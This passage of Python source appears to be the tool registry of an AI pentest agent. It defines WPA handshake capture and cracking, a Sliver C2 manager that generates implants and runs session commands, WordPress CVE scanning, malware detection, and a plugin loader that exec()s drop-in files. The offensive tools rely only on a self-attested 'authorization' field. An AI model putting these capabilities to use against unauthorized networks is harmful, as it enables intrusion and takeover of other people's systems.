                 "over Windows .evtx. Read-only, LOCAL paths — no target/authorization needed. Runs in "
                 "the purple container if present, else the toolbox, else the host. `sygnif kali-setup` "
                 "provisions LOKI + rules."),
        "args": {"mode": "ioc|webshell|yara|rootkit|malware|sigma", "path": "local file/dir/log to scan", "rules": "(yara) optional path to a .yar ruleset"},
        "func": tool_detect,
    },
    "wifi_capture": {
        "desc": ("Capture a WPA handshake / PMKID on a network YOU are authorized to test "
                 "(hcxdumptool). Requires a monitor-mode 'interface', a 'bssid', and 'authorization'."),
        "args": {"interface": "PHYSICAL iface e.g. wlan0 (hcxdumptool sets monitor mode itself)", "bssid": "target AP BSSID/SSID you are authorized to test", "authorization": "attestation", "channel": "optional channel+band e.g. 11a (else all freqs)", "seconds": "capture window (default 60)", "out": "output pcapng path", "extra": "optional flags"},
        "func": tool_wifi_capture,
    },
    "c2": {
        "desc": ("Manage a Sliver C2 for an AUTHORIZED red-team / adversary-emulation engagement: "
                 "status, start a listener, generate a beacon/implant for the authorized scope, "
                 "list sessions/beacons, or exec a command in a session. Requires 'target' "
                 "(engagement/scope) + 'authorization' for everything except status; SCOPE.md-"
                 "confined. Orchestrates a standard framework — no custom implants/evasion."),
        "args": {"op": "status|listener|generate|sessions|beacons|exec|help", "target": "engagement/scope you are authorized to test", "authorization": "attestation", "proto": "https|http|mtls", "lhost": "C2 callback host", "lport": "listener port", "os": "implant os", "arch": "implant arch", "format": "exe|shellcode|shared", "beacon": "true for a beacon", "save": "implant output path", "session": "session id (exec)", "command": "command to run (exec)"},
        "func": tool_c2,
    },
    "wifi_crack": {
        "desc": ("Convert a WPA capture to a hash and crack it offline (hcxpcapngtool + hashcat, "
                 "else aircrack-ng). Requires 'authorization', a 'capture' file and a 'wordlist'."),
        "args": {"capture": "path to .pcapng/.cap", "authorization": "attestation", "wordlist": "path (default rockyou)", "target": "network/engagement label"},
        "func": tool_wifi_crack,
    },
    "wp_vulnscan": {
        "desc": ("Scan a WordPress site you own/are authorized to test: passively detect "
                 "core, plugins and themes with their versions, flag out-of-date components "
                 "(via the WordPress.org API), and list known CVEs. With WPSCAN_API_TOKEN set "
                 "it uses the WPScan vulnerability DB (exact affected ranges); otherwise pass "
                 "cves=true for a keyless NVD keyword lookup (best-effort). Authorized targets only."),
        "args": {"url": "the WordPress site URL (yours / authorized)",
                 "cves": "optional 'true' to also run keyless CVE lookups (slower)"},
        "func": tool_wp_vulnscan,
    },
    "vuln_check": {
        "desc": ("Known-vulnerability tester. Look up CVEs for a product+version, a WordPress "
                 "plugin/theme slug, or a specific CVE id. Uses the WPScan API when "
                 "WPSCAN_API_TOKEN is set (WordPress components, exact ranges), else keyless NVD."),
        "args": {"product": "product or software name, e.g. 'elementor'",
                 "slug": "alternatively a WordPress plugin/theme slug",
                 "version": "optional version to narrow the match",
                 "kind": "'plugins' (default) or 'themes' for a WP slug",
                 "cve": "alternatively a CVE id to fetch its details, e.g. CVE-2024-1234"},
        "func": tool_vuln_check,
    },
    "playbook": {
        "desc": ("Return the offline pentest methodology shipped with the seat — the kill-chain "
                 "checklist and the role modes. section=<phase or role> for one part. Needs no "
                 "network; use it when the van has no signal."),
        "args": {"section": "optional: recon|enum|vuln|exploit|postexploit|report|webapp|wpsec|hosting|redteam|network|passwords|cellular|shodan|containers|cloud|crypto|website|api|android|scout|analyzer|exploiter|reporter"},
        "func": tool_playbook,
    },
}


def _load_plugins(reg: dict) -> None:
    """Let the operator extend the registry from a drop-in file."""
    for path in (
        os.path.join(SEAT_DIR, "custom_tools.py"),
        os.path.expanduser("~/.sygnif/sygnif-py-tools.py"),
    ):
        if not os.path.isfile(path):
            continue
        ns: dict = {}
        try:
            with open(path, encoding="utf-8") as fh:
                exec(compile(fh.read(), path, "exec"), ns)  # noqa: S102 - operator's own file
            if callable(ns.get("register")):
                ns["register"](reg)
        except Exception as e:  # noqa: BLE001
            print(f"[sygnif-py] plugin {path} failed to load: {e}")


def build_registry(tool_names: list[str]) -> dict:
    """Return the active tool registry for a preset's tool list, plus plugins."""
    reg = {n: dict(BUILTIN_TOOLS[n]) for n in tool_names if n in BUILTIN_TOOLS}
    _load_plugins(reg)
    return reg


def run_tool(reg: dict, name: str, args: dict) -> str:
    tool = reg.get(name)
    if not tool:
        return f"[unknown tool '{name}'. available: {', '.join(reg) or '(none)'}]"
    try:
        return tool["func"](args or {})
    except Exception as e:  # noqa: BLE001
        return f"[tool '{name}' raised: {e}]"
